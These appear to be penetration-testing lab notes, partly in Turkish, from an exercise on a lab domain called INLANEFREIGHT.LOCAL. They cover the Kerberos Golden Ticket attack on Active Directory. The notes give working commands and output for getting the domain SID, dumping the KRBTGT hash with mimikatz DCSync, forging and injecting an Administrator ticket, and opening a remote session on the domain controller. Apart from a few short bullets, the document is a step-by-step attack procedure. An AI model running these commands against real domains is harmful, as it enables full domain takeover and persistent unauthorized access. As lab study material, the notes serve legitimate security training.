# Golden Ticket

## Some Considerations

* DC etkileşimi gereklidir.
* Kapsamı geniştir.
* Gürültülüdür.

## Requirements

* Taklit edilecek kullanıcı adı.
* Domain.
* Domain SID.
* KRBTGT hesabına ait NTLM hash.

## Retrieving Domain SID

```pwsh
PS C:\Users\htb-student> Get-DomainSID
```

```output title="Output"
S-1-5-21-1870146311-1183348186-593267556
```

## KRBTGT Hash

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:INLANEFREIGHT.LOCAL" exit
```

## Forging the Golden Ticket (TGT)

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe "kerberos::golden /ptt /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:C0231BD8A4A4DE92FCA0760C0BA9E7A6 /renewmax:7 /endin:8" exit
```

```output title="Output" hl_lines="1-3 16"
User      : Administrator
Domain    : INLANEFREIGHT.LOCAL (INLANEFREIGHT)
SID       : S-1-5-21-1870146311-1183348186-593267556
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: c0231bd8a4a4de92fca0760c0ba9e7a6 - rc4_hmac_nt
Lifetime  : 1/29/2025 9:16:19 AM ; 1/29/2025 9:24:19 AM ; 1/29/2025 9:23:19 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ INLANEFREIGHT.LOCAL' successfully submitted for current session
```

## Verifying the Ticket

```pwsh
PS C:\Users\htb-student> klist
```

```output title="Output" hl_lines="5-6"
Current LogonId is 0:0x739b2

Cached Tickets: (1)

#0>     Client: Administrator @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 1/29/2025 9:16:19 (local)
        End Time:   1/29/2025 9:24:19 (local)
        Renew Time: 1/29/2025 9:23:19 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

## Using the Ticket

```pwsh
PS C:\Users\htb-student> Enter-PSSession DC01.INLANEFREIGHT.LOCAL
[DC01.INLANEFREIGHT.LOCAL]: PS C:\Users\Administrator\Documents> whoami
```

```output title="Output"
inlanefreight\administrator
```
